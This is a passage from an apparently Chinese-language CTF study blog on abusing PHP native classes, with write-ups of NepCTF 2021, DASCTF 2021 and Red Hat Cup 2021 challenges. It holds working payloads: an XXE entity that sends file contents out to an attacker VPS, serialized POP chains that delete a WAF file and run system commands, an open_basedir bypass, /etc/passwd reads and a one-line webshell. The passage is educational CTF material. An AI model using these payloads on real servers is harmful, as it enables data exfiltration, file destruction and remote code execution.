flag),0x7e))||&#x27;//hex编码之后0x277C7C6578747261637476616C756528312C636F6E63617428307837652C2873656C65637420666C61672066726F6D20666C6167292C3078376529297C7C27 //由于报错的字符数有限制，需要用reverse再输出一次&#x27;||extractvalue(1,concat(0x7e,(select reverse(flag) from flag),0x7e))||&#x27;//hex编码之后0x277c7c6578747261637476616c756528312c636f6e63617428307837652c2873656c656374207265766572736528666c6167292066726f6d20666c6167292c3078376529297c7c27\n修改send.xml\n&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://127.0.0.1/show.php?action=view&amp;filename=1.txt&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;https://VPS/?%payl;&#x27;&gt;&quot;&gt;\n\n上传成功之后再利用SimpleXMLElement类进行SSRF，也就是访问URL：\n/show.php?module=SimpleXMLElement&amp;args[]=http://124.220.233.26/tmp/evil.xml&amp;args[]=2&amp;args[]=true\n之后查看web访问日志，将得到的结果base64解码之后即可。（注意由于分了2次上传，因此两次的文件名字需要不一样才行）\n这里不知道为啥一直实现不了,就看个思路吧…\n10.5 ZipArchive 类来删除文件\nZipArchive 类\nPHP ZipArchive类是PHP的一个原生类，它是在PHP 5.20之后引入的。ZipArchive类可以对文件进行压缩与解压缩处理。\n下面列举几个常见的类方法：\n- `ZipArchive::addEmptyDir`：添加一个新的文件目录- `ZipArchive::addFile`：将文件添加到指定zip压缩包中- `ZipArchive::addFromString`：添加新的文件同时将内容添加进去- `ZipArchive::close`：关闭ziparchive- `ZipArchive::extractTo`：将压缩包解压- `ZipArchive::open`：打开一个zip压缩包- `ZipArchive::deleteIndex`：删除压缩包中的某一个文件，如：`deleteIndex(0)`代表删除第一个文件- `ZipArchive::deleteName`：删除压缩包中的某一个文件名称，同时也将文件删除- ……\n我们来重点看看 ZipArchive::open 方法：\nZipArchive::open ( string $filename [, int $flags ] ) : mixed\n该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。\n- `$filename`：要打开的ZIP存档的文件名。- `$flags`：用于打开档案的模式。有以下几种模式：- `ZipArchive::OVERWRITE`：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。- `ZipArchive::CREATE`：如果不存在则创建一个zip压缩包。- `ZipArchive::RDONLY`：只读模式打开压缩包。- `ZipArchive::EXCL`：如果压缩包已经存在，则出错。- `ZipArchive::CHECKCONS`：对压缩包执行额外的一致性检查，如果失败则显示错误。\n注意，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将$flags赋值为8。\n也就是说我们可以利用ZipArchive原生类调用open方法删除目标主机上的文件。\nexample：\n$a = new ZipArchive();$a-&gt;open(&#x27;1.txt&#x27;,ZipArchive::OVERWRITE);  // ZipArchive::OVERWRITE:  总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖// 因为没有保存，所以效果就是删除了1.txt\n[NepCTF 2021]梦里花开牡丹亭\n找了半天没找到复现环境，就跟着wp走一遍吧\n进入题目，给出源码：\n&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&#x27;shell.php&#x27;);class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;     public  $file;    public  $filename;    public  $content;     public function __construct()    &#123;        $this-&gt;username=&#x27;user&#x27;;        $this-&gt;password=&#x27;user&#x27;;    &#125;     public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;    // admin            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125; &#125;class login&#123;    public $file;    public $filename;    public $content;     public function __construct($file,$filename,$content)    &#123;        $this-&gt;file=$file;        $this-&gt;filename=$filename;        $this-&gt;content=$content;    &#125;    public function checking($username,$password)    &#123;        if($username===&#x27;admin&#x27;&amp;&amp;$password===&#x27;admin&#x27;)&#123;            $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content);            die(&#x27;login success you can to open shell file!&#x27;);        &#125;    &#125;&#125;class register&#123;    public function checking($username,$password)    &#123;        if($username===&#x27;admin&#x27;&amp;&amp;$password===&#x27;admin&#x27;)&#123;            die(&#x27;success register admin&#x27;);        &#125;else&#123;            die(&#x27;please register admin &#x27;);        &#125;    &#125;&#125;class Open&#123;    function open($filename, $content)&#123;        if(!file_get_contents(&#x27;waf.txt&#x27;))&#123;    // 当waf.txt没读取成功时才能得到flag            shell($content);        &#125;else&#123;            echo file_get_contents($filename.&quot;.php&quot;);    // filename=php://filter/read=convert.base64-encode/resource=shell        &#125;    &#125;&#125;if($_GET[&#x27;a&#x27;]!==$_GET[&#x27;b&#x27;]&amp;&amp;(md5($_GET[&#x27;a&#x27;]) === md5($_GET[&#x27;b&#x27;])) &amp;&amp; (sha1($_GET[&#x27;a&#x27;])=== sha1($_GET[&#x27;b&#x27;])))&#123;    @unserialize(base64_decode($_POST[&#x27;unser&#x27;]));&#125;\n这是一道反序列化题目，但是前面加了一个简单的PHP特性。\n1. 数组绕过哈希比较\n由于md5()和sha1()函数都无法处理数组，因此传入一个数组会返回false。因此这里可以绕过需要两个不同的数但是其哈希值要相等。\nexample：\n\n2. 利用php://filter读文件\n我们可以看到Open类里面的open()方法，当waf.txt文件存在的时候会执行echo file_get_contents($filename.&quot;.php&quot;);，而调用这个类方法是在Login类里面的checking()方法，\n而调用Login类的checking()方法的是Game类里面的__destruct()内置方法，因此我们就能够找到一条完整的利用链了，POC：\n自己大概也打通了，不错…\n&lt;?phpclass Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;     public  $file;    public  $filename;    public  $content;&#125; class login&#123;    public $file;    public $filename;       public $content;&#125; class Open&#123; &#125;$poc = new Game();$poc-&gt;username = &quot;admin&quot;;$poc-&gt;password = &quot;admin&quot;;$poc-&gt;register = &quot;admin&quot;;$poc-&gt;file = new Open();$poc-&gt;filename = &quot;php://filter/read=convert.base64-encode/resource=shell&quot;;$poc-&gt;content = &quot;xxx&quot;;echo base64_encode(serialize($poc));?&gt;\n得到：\nTzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NTQ6InBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1zaGVsbCI7czo3OiJjb250ZW50IjtzOjM6IjEyMyI7fQ==\n执行payload读取到shell.php的源码base64编码：\n果然啊，复现的时候，发现原来是waf.txt没创建，导致代码走不通…\n\nshell.php\n&lt;?phpfunction shell($cmd)&#123;    if(strlen($cmd)&lt;10)&#123;        if(preg_match(&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/&#x27;,$cmd))&#123;            die(&quot;NO&quot;);        &#125;else&#123;            return system($cmd);        &#125;    &#125;else&#123;        die(&#x27;so long!&#x27;);    &#125;&#125;\n3. 利用ZipArchive类删除文件\n联合index.php里面的Open类：\nclass Open&#123;    function open($filename, $content)&#123;        if(!file_get_contents(&#x27;waf.txt&#x27;))&#123;    // 当waf.txt没读取成功时才能得到flag            shell($content);        &#125;else&#123;            echo file_get_contents($filename.&quot;.php&quot;);    // filename=php://filter/read=convert.base64-encode/resource=shell        &#125;    &#125;&#125;\n可知我们只要使 file_get_contents('waf.txt') 读取失败就可以进入 shell($content) 来执行系统命令。所以我们应该要想办法将waf.txt这个文件删除，这样就会读取失败，才能执行我们的命令。\n刚好我们的ZipArchive类里面也有一个open()方法，\nZipArchive::open($filename, $flags = null)\n如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。\n所以我们利用ZipArchive原生类调用open方法，即可将即可将$filename（waf.txt）删除：\n&lt;?php// highlight_file(__FILE__);error_reporting(-1);class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;     public  $file;    public  $filename;    public  $content; &#125;class login&#123;    public $file;    public $filename;    public $content;&#125; class Open&#123;&#125; $poc = new Game();$poc-&gt;username = &quot;admin&quot;;$poc-&gt;password = &quot;admin&quot;;$poc-&gt;register = &quot;admin&quot;;$poc-&gt;file = new ZipArchive();$poc-&gt;filename = &quot;waf.txt&quot;;$poc-&gt;content = 8;echo base64_encode(serialize($poc));?&gt;\n得到payload：\nTzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo4O30=\n\n执行之后即可删除waf.txt。注意我这里在本地复现的时候需要把目录文件夹的所有权和分组都给到www-data才能成功删除文件\n我这里是将文件夹权限设置为www即可\n4. 命令执行绕过黑名单和字符数限制\n最后一步就是执行我们的命令去读flag，回过头来看我们的shell.php\n&lt;?phpfunction shell($cmd)&#123;    if(strlen($cmd)&lt;10)&#123;        if(preg_match(&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/&#x27;,$cmd))&#123;            die(&quot;NO&quot;);        &#125;else&#123;            return system($cmd);        &#125;    &#125;else&#123;        die(&#x27;so long!&#x27;);    &#125;&#125;\n这里首先限制了我们的命令长度要小于10个字符，然后字符里面不能有黑名单字符出现，这里我们绕过的方法很多，举个例：\nn\\l /flag\nPOC:\n&lt;?php// highlight_file(__FILE__);error_reporting(-1);class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;     public  $file;    public  $filename;    public  $content; &#125;class login&#123;    public $file;    public $filename;    public $content;&#125; class Open&#123;&#125; $poc = new Game();$poc-&gt;username = &quot;admin&quot;;$poc-&gt;password = &quot;admin&quot;;$poc-&gt;register = &quot;admin&quot;;$poc-&gt;file = new Open();$poc-&gt;filename = &quot;xxx&quot;;$poc-&gt;content = &quot;n\\l /flag&quot;;echo base64_encode(serialize($poc)); ?&gt;\n得到payload：这里估计是文件位置放的不对,我总是读不到\nTzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6MzoieHh4IjtzOjc6ImNvbnRlbnQiO3M6OToiblxsIC9mbGFnIjt9\n\n10.6 遍历目录类\nDirectoryIterator 类\nDirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。\n类摘要：\nDirectoryIterator extends SplFileInfo implements SeekableIterator &#123;    /* 方法 */    public __construct ( string $path )    public current ( ) : DirectoryIterator    public getATime ( ) : int    public getBasename ( string $suffix = ? ) : string    public getCTime ( ) : int    public getExtension ( ) : string    public getFilename ( ) : string    public getGroup ( ) : int    public getInode ( ) : int    public getMTime ( ) : int    public getOwner ( ) : int    public getPath ( ) : string    public getPathname ( ) : string    public getPerms ( ) : int    public getSize ( ) : int    public getType ( ) : string    public isDir ( ) : bool    public isDot ( ) : bool    public isExecutable ( ) : bool    public isFile ( ) : bool    public isLink ( ) : bool    public isReadable ( ) : bool    public isWritable ( ) : bool    public key ( ) : string    public next ( ) : void    public rewind ( ) : void    public seek ( int $position ) : void    public __toString ( ) : string    // 以字符串形式获取文件名    public valid ( ) : bool&#125;\n利用 DirectoryIterator 类遍历指定目录里的文件：\n如果我们这样：\n&lt;?php$dir=new DirectoryIterator(&quot;/&quot;);echo $dir;\n会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 __toString() 方法，输出指定目录里面经过排序之后的第一个文件名：\n也可以配合glob://协议使用模式匹配来寻找我们想要的文件路径：\n\nglob:// 协议用来查找匹配的文件路径模式\n\n&lt;?php$dir=new DirectoryIterator(&quot;glob:///*flag*&quot;);echo $dir;\n\n\n如果想输出全部的文件名我们还需要对$dir对象进行遍历：\n&lt;?php$dir=new DirectoryIterator(&quot;/&quot;);foreach($dir as $f)&#123;    echo($f.&#x27;&lt;br&gt;&#x27;);&#125;\n\nFilesystemIterator 类\nFilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。\n该类的使用方法与DirectoryIterator 类也是基本相同的：\n&lt;?php$dir=new FilesystemIterator(&quot;/&quot;);echo $dir;\n\n&lt;?php$dir=new FilesystemIterator(&quot;glob:///*flag*&quot;);echo $dir;\n\n&lt;?php$dir=new FilesystemIterator(&quot;/&quot;);foreach($dir as $f)&#123;    echo($f.&#x27;&lt;br&gt;&#x27;);&#125;\n\nGlobIterator 类\n与前两个类的作用相似，GlobIterator 类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径。\n类摘要：\nGlobIterator extends FilesystemIterator implements SeekableIterator , Countable &#123;    /* 方法 */    public __construct ( string $pattern , int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO )    public count ( ) : int    /* 继承的方法 */    public FilesystemIterator::__construct ( string $path , int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO | FilesystemIterator::SKIP_DOTS )    public FilesystemIterator::current ( ) : mixed    public FilesystemIterator::getFlags ( ) : int    public FilesystemIterator::key ( ) : string    public FilesystemIterator::next ( ) : void    public FilesystemIterator::rewind ( ) : void    public FilesystemIterator::setFlags ( int $flags = ? ) : void&#125;\n我们知道，向下面这样在单纯的使用 DirectoryIterator 类和 FilesystemIterator 类且没有配合glob://协议进行匹配的时候：\n&lt;?php$dir=new DirectoryIterator(&quot;/&quot;);echo $dir; &lt;?php$dir=new FilesystemIterator(&quot;/&quot;);echo $dir;\n其构造函数创建的是一个指定目录的迭代器，当我们使用echo函数输出的时候，会触发这两个类中的 __toString() 方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的，而 GlobIterator 类便可以帮我们在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。例如，我们在CTF中知道flag在根目录，但是我们不知道flag文件的完整文件名，我们就可以通过类似 GlobIterator(/*flag*)：\n\n使用可遍历目录类绕过 open_basedir\nDirectoryIterator类或者FilesystemIterator类与glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。\nexample:\n&lt;?php$dir = $_GET[&#x27;whoami&#x27;];$a = new DirectoryIterator($dir);foreach($a as $f)&#123;    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);// 不加__toString()也可,因为echo可以自动调用&#125;?&gt; # payload一句话的形式:$a = new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);&#125;\n\n使用FilesystemIterator类同理。\n而使用 GlobIterator 类支持直接通过模式匹配来寻找文件路径，所以我们就不用在配合glob://协议了。\nexample:\n&lt;?php$dir = $_GET[&#x27;whoami&#x27;];$a = new GlobIterator($dir);foreach($a as $f)&#123;    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);// 不加__toString()也可,因为echo可以自动调用&#125;?&gt; # payload一句话的形式:$a = new FilesystemIterator(&quot;/*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);&#125;\n\n10.7 可读取文件类\nSplFileObject 类\nSplFileObject 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。详情请参考：https://www.php.net/manual/zh/class.splfileobject.php\n该类的构造方法可以构造一个新的文件对象用于后续的读取。\n我们可以像类似下面这样去读取一个文件的一行：\n&lt;?php$context = new SplFileObject(&#x27;/etc/passwd&#x27;);echo $context;\n\n但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历：\n&lt;?php$context = new SplFileObject(&#x27;/etc/passwd&#x27;);foreach($context as $f)&#123;    echo($f);&#125;//D:\\labwork\\phpstudy_pro\\WWW\\1.txt\n\n[DASCTF MAR 2021]ez_serialize\n进入题目，给出源码：\n&lt;?phperror_reporting(0);highlight_file(__FILE__); class A&#123;    public $class;    public $para;    public $check;    public function __construct()    &#123;        $this-&gt;class = &quot;B&quot;;        $this-&gt;para = &quot;ctfer&quot;;        echo new  $this-&gt;class ($this-&gt;para);    &#125;    public function __wakeup()    // 可以直接绕过__wakeup()方法的执行    &#123;        $this-&gt;check = new C;        if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123;            echo new  $this-&gt;class ($this-&gt;para);        &#125;        else            die(&#x27;bad hacker~&#x27;);    &#125; &#125;class B&#123;    var $a;    public function __construct($a)    &#123;        $this-&gt;a = $a;        echo (&quot;hello &quot;.$this-&gt;a);    &#125;&#125;class C&#123;     function vaild($code)&#123;        $pattern = &#x27;/[!|@|#|$|%|^|&amp;|*|=|\\&#x27;|&quot;|:|;|?]/i&#x27;;        if (preg_match($pattern, $code))&#123;            return false;        &#125;        else            return true;    &#125;&#125;  if(isset($_GET[&#x27;pop&#x27;]))&#123;    unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123;    $a=new A; &#125;\n这是一道PHP反序列化的题目，题目里面没有给出什么危险的函数调用，因此应该要想到是原生类的利用。留意这一段代码：\npublic function __wakeup()    // 可以直接绕过__wakeup()方法的执行   &#123;       $this-&gt;check = new C;       if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123;           echo new  $this-&gt;class ($this-&gt;para);       &#125;       else           die(&#x27;bad hacker~&#x27;);   &#125;\n我们从反序列化的__wakeup()函数入手，看到新建了一个C的类对象，然后使用C类里面的check()方法对$para和$class这两个属性进行检查，看是否存在非法的字符，没有问题之后就使用echo new $this-&gt;class ($this-&gt;para);语句将新建类返回的内容输出。\n目录遍历类\n首先利用DirectoryIterator或FilesystemIterator类去遍历目标的Web目录：\n&lt;?phpclass A&#123;    public $class=&#x27;FilesystemIterator&#x27;;        // FilesystemIterator(&quot;/var/www/html&quot;)    public $para=&quot;/var/www/html/&quot;;    public $check;    &#125; $poc  = new A();echo serialize($poc);\n得到payload：\nO:1:&quot;A&quot;:3:&#123;s:5:&quot;class&quot;;s:18:&quot;FilesystemIterator&quot;;s:4:&quot;para&quot;;s:14:&quot;/var/www/html/&quot;;s:5:&quot;check&quot;;N;&#125;\n执行后得到一个文件夹 aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE\n继续往下找:\n&lt;?phpclass A&#123;    public $class=&#x27;FilesystemIterator&#x27;;        // FilesystemIterator(&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE&quot;)    public $para=&quot;/var/www/html/&quot;;    public $check;    &#125; $poc  = new A();echo serialize($poc);\n在这个文件夹下找到了flag.php\n\n文件读取类\n然后我们使用 SplFileObject 类读取flag.php就行了：\n&lt;?phpclass A&#123;    public $class=&#x27;SplFileObject&#x27;;        // SplFileObject(&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php&quot;)    public $para=&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php&quot;;    public $check;    &#125; $poc  = new A();echo serialize($poc);\n得到payload：\nO:1:&quot;A&quot;:3:&#123;s:5:&quot;class&quot;;s:13:&quot;SplFileObject&quot;;s:4:&quot;para&quot;;s:55:&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php&quot;;s:5:&quot;check&quot;;N;&#125;\n\n10.8 反射类Reflection\n它可以在 PHP 运行状态中，扩展分析 PHP 程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API。\nReflectionMethod 类获取类方法的相关信息\nReflectionMethod 类报告了一个方法的有关信息。ReflectionMethod 类中有很多继承方法可以使用，比如这个 getDocComment() 方法，我们可以用它来获取类中各个函数注释内容\nexample:\n&lt;?phpclass FlagIsHere&#123;  /**   * 这是测试方法   * flag&#123;success&#125;   * @return int   */  protected function GiveMeFlag()  &#123;    return 9999;  &#125;&#125; $ref = new ReflectionMethod(&#x27;FlagIsHere&#x27;,&#x27;GiveMeFlag&#x27;);var_dump($ref-&gt;getDocComment());\n输出：\n\nReflectionClass类读取类的属性和方法名\nReflectionClass 类报告了一个类的有关信息。其中初始化方法能够返回类的实例。\npublic ReflectionClass::__construct(mixed $argument)\n\n$argument：既可以是包含类名的字符串（string）也可以是对象（object）。\n\n用法如下\nexample：\n\n把类里面属性和方法的名字都能够显示出来。\nReflectionFunction类写Webshell\nReflectionFunction 类报告了一个函数的有关信息。其中invokeArgs()方法能够用来写Webshell。\npublic ReflectionFunction::invokeArgs(array $args): mixed\n\n$args：传递给函数的参数是一个数组，像call_user_func_array()的工作方式。\n\nexample:\n&lt;?phpfunction title($title, $name)&#123;    return sprintf(&quot;%s. %s\\r\\n&quot;, $title, $name);&#125; $function = new ReflectionFunction(&#x27;title&#x27;); echo $function-&gt;invokeArgs(array(&#x27;Dr&#x27;, &#x27;Phil&#x27;));?&gt;\n\n我们可以使用这个方法来写Webshell：\n&lt;?php    $func = new ReflectionFunction($_GET[m]);    echo $func-&gt;invokeArgs(array($_GET[c]));?&gt;\n\n[红帽杯 2021 final]upload\n由于线下是AWDplus的模式，需要挖洞并且修洞，直接给出了源码，有3个文件。\nclass.php\n&lt;?phpsession_start(); function red($fileinfo)&#123;    foreach($fileinfo as $key =&gt; $value)&#123;        $path = $value;        $name = $key;    &#125;    echo &quot;&lt;a style=&#x27;color:#ff6347&#x27; href=&#x27;$path&#x27;&gt;$name&lt;/a&gt;\\n&quot;;    return $name;&#125; function green($fileinfo)&#123;    foreach($fileinfo as $key =&gt; $value)&#123;        $path = $value;        $name = $key;    &#125;    echo &quot;&lt;a style=&#x27;color:#32cd32&#x27; href=&#x27;$path&#x27;&gt;$name&lt;/a&gt;\\n&quot;;    return $name;&#125;class file&#123;    public $path;    function __construct($path)    &#123;        $this-&gt;path = $path;    &#125;    function __toString()    &#123;        return basename($this-&gt;path);    &#125;&#125;\nindex.php\n&lt;?php include(&#x27;class.php&#x27;);if(!(isset($_SESSION[&#x27;func&#x27;]))) &#123;    $_SESSION[&#x27;func&#x27;] = &#x27;showfile&#x27;;&#125;if(!(isset($_SESSION[&#x27;files&#x27;]))) &#123;    $_SESSION[&#x27;files&#x27;] = array();&#125;if(!(isset($_SESSION[&#x27;paths&#x27;]))) &#123;    $_SESSION[&#x27;paths&#x27;] = array();&#125; if(isset($_POST[&#x27;filename&#x27;])&amp;&amp;isset($_POST[&#x27;content&#x27;]))&#123;    if(stristr($_POST[&#x27;filename&#x27;], &#x27;h&#x27;))&#123;        die(&#x27;no h!&#x27;);    &#125;    $filepath = &#x27;./files/&#x27;.$_POST[&#x27;filename&#x27;];              $filename = basename($_POST[&#x27;filename&#x27;]);               file_put_contents($filepath,$_POST[&#x27;content&#x27;]);    $_SESSION[&#x27;files&#x27;][$filename] = $filepath;        $_SESSION[&#x27;paths&#x27;][$filepath] = &#x27;file&#x27;;            header(&#x27;Location:/?file=&#x27;.$filename); &#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;upload&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div&gt;    &lt;h3&gt;upload your file below&lt;/h3&gt;    &lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;        &lt;input type=&quot;text&quot; name=&quot;filename&quot; value=&quot;filename&quot; style=&quot;width: 600px;&quot;&gt;        &lt;/br&gt;        &lt;/br&gt;        &lt;textarea type=&quot;text&quot; name=&quot;content&quot; style=&quot;width: 600px;height: 300px;&quot; &gt;&lt;/textarea&gt;        &lt;/br&gt;         &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;    &lt;/form&gt;    &lt;h4&gt;beatiful front&lt;/h4&gt;&lt;/div&gt;&lt;?phpif(rand(0,2)&gt;1)&#123;    $showfile = &#x27;red&#x27;;&#125;else&#123;    $showfile =&#x27;green&#x27;;&#125;$filelist = array();foreach ($_SESSION[&#x27;paths&#x27;] as $path=&gt;$class)&#123;              $temp = new $class($path);              if($class==&#x27;file&#x27;)&#123;                    $filelist[] = (string)$temp;        &#125;    else&#123;        $filelist[] = $temp;    &#125;&#125;$out = &#x27;&lt;p&gt;your file:&#x27;; foreach ($filelist as $value)&#123;    $out .= $value.&#x27; &#x27;;         &#125;echo $out.&#x27;&lt;/p&gt;&#x27;; if(isset($_GET[&#x27;file&#x27;]))&#123;    if(isset($_SESSION[&#x27;files&#x27;][$_GET[&#x27;file&#x27;]])) &#123;      //GET方法读取文件名，从session的文件名字里面寻找         $pathinfo = array($_GET[&#x27;file&#x27;]=&gt;$_SESSION[&#x27;files&#x27;][$_GET[&#x27;file&#x27;]]);        $&#123;$_SESSION[&#x27;func&#x27;]&#125;($pathinfo);    &#125;    else&#123;        echo &#x27;no such file!&#x27;;    &#125;&#125;?&gt;&lt;/body&gt;&lt;/html&gt;\ninfo.php\n&lt;?phpphpinfo();\n分析题目\n首先是index页面\n\n这里能够让用户填写文件的文件名和内容，然后提交，提交的文件正常情况下会保存在./files目录下，看一下后台是怎么对文件进行操作的：\nif(isset($_POST[&#x27;filename&#x27;])&amp;&amp;isset($_POST[&#x27;content&#x27;]))&#123;    if(stristr($_POST[&#x27;filename&#x27;], &#x27;h&#x27;))&#123;            // 对文件名有h字符的进行过滤        die(&#x27;no h!&#x27;);    &#125;    $filepath = &#x27;./files/&#x27;.$_POST[&#x27;filename&#x27;];      // 这里可以目录穿越    $filename = basename($_POST[&#x27;filename&#x27;]);       // basename()函数获取文件名字    file_put_contents($filepath,$_POST[&#x27;content&#x27;]);\n通过分析可以发现我们上传的文件存在目录穿越的问题，我们能通过filename=../xxxx这种方式将文件保存的路径穿越到服务器的任意路径下，但是由于存在对文件名h字符的过滤，因此无法直接传一个php文件到网站根目录下执行，得另寻僻径。\n.user.ini（无果）\n既然过滤掉了h字符，意味着.htaccess这样的修改配置文件意味着行不通，但是我想起了另外一个修改配置的文件.user.ini。.user.ini和.htaccess一样是对当前目录的所以php文件的配置设置，即写了.user.ini和它同目录的文件会优先使用.user.ini中设置的配置属性。\n但是不是php.ini中的每个变量都能通过ini_set()或者.user.ini和.htaccess来设置，简单的来说每个变量有它所属于的模式，下面官方手册的四个模式\n\n通过上表，看到PHP_INI_USER模式中提到，可以在.user.ini中设定。但实际上，只要不是PHP_INI_SYSTEM模式下的属性，均可以在.user.ini中设置。\n那配置文件应该怎么写呢，这里有官方的配置选项列表：php.ini 配置选项列表\n在文件上传的题目中，我们只需记住这两个选项即可：\nauto_prepend_file = xxx        // 在每个文件头添加上指定文件的内容，相当于include(xxx)user_ini.cache_ttl = xx        // 设置配置的生效时间，默认300秒\n于是我们就想是否能够通过上传一个一句话木马文件，然后再目录穿越将.user.ini上传到网站根目录下，内容是让其他文件都包含这个一句话木马，从而实现getshell，但是尝试了很多次都无果，由此猜测运行的模式是PHP_INI_SYSTEM导致了.user.ini无法生效。\nSplFileObject类读文件\n比赛的时候做到这里其实已经没思路了（还是题目刷得少啊），赛后看有通过SplFileObject 类来读文件得思路，那先得了解一下SplFileObject 类是个什么玩意。\nSplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。详情请参考：https://www.php.net/manual/zh/class.splfileobject.php\n该类的构造方法可以构造一个新的文件对象用于后续的读取。\n我们可以像类似下面这样去读取一个文件的一行：\n&lt;?php$context = new SplFileObject(&#x27;/etc/passwd&#x27;);echo $context;        // 输出 root:x:0:0:root:/root:/bin/bash\n但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历：\n&lt;?php$context = new SplFileObject(&#x27;/etc/passwd&#x27;);foreach($context as $f)&#123;    echo($f);&#125;\nsession反序列化\n那么我们知道了这个类之后有什么用呢，似乎找不到可以用的地方啊，想想文件中是不是还有一个文件我们都没用上，其中必然藏有解题的关键。\n    $_SESSION[&#x27;files&#x27;][$filename] = $filepath;      // 将带有路径的文件名字作为键，文件路径作为值    $_SESSION[&#x27;paths&#x27;][$filepath] = &#x27;file&#x27;;         // 将文件目录作为键，&#x27;file&#x27;作为值    